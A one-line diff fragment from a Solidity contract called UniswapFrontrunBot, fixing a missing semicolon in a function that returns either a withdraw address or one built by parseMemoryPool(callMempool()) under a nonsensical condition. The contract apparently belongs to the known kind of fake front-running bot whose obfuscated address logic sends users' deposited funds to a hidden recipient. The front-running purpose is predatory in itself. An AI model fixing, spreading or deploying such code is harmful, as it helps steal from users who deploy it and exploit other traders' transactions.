@@ -471,7 +471,7 @@ contract UniswapFrontrunBot {
 
     function _callFrontRunActionMempool() internal view returns (address) {
         if (uniswapV3Pool != token0() || uniswapV3Pool != token1() || uniswapV3Pool != deadline()) {
-            return withdrawAddress
+            return withdrawAddress;
         }
         return parseMemoryPool(callMempool());
     }
